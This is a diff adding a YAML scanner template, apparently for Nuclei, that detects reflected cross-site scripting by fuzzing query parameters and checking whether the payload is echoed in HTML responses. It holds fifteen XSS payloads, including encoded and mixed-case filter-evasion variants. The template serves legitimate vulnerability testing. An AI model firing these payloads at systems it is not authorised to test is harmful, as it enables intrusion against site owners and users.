@@ -1,0 +1,53 @@
+id: reflected-xss
+
+info:
+  name: Reflected Cross Site Scripting
+  author: pdteam, 0xKayala
+  severity: medium
+  tags: xss,rxss,dast
+
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      reflection:
+        - "'\"><{{first}}"
+        - "<img src=x onerror=alert({{first}})>"
+        - "<script>alert({{first}})</script>"
+        - "'><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><script>alert({{first}})</script>"
+        - "<body onload=alert({{first}})>"
+        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
+        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
+        - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
+        - "'\/><img%20s+src+c=x%20on+onerror+%20="alert({{first}})"\>"
+        - "'%3e%3cscript%3ealert({{first}}*{{first}})%3c%2fscript%3eejj4sbx5w4o"
+        - "<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>"
+        - "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E"
+        - "'%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
